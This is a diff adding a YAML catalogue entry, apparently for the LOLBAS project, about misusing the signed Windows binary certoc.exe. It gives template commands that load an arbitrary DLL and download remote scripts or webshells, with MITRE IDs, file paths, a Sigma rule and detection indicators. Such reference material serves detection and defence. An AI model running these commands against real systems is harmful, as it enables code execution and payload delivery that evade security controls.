@@ -1,0 +1,36 @@
+---
+Name: CertOC.exe
+Description: Used for installing certificates
+Author: 'Ensar Samil'
+Created: 2021-10-07
+Commands:
+  - Command: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
+    Description: Loads the target DLL file
+    Usecase: Execute code within DLL file
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows Server 2022
+    Tags:
+      - Execute: DLL
+  - Command: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
+    Description: Downloads text formatted files
+    Usecase: Download scripts, webshells etc.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows Server 2022
+Full_Path:
+  - Path: c:\windows\system32\certoc.exe
+  - Path: c:\windows\syswow64\certoc.exe
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
+  - IOC: Process creation with given parameter
+  - IOC: Unsigned DLL load via certoc.exe
+  - IOC: Network connection via certoc.exe
+Resources:
+  - Link: https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
+  - Link: https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
+Acknowledgement:
+  - Person: Ensar Samil
+    Handle: '@sblmsrsn'
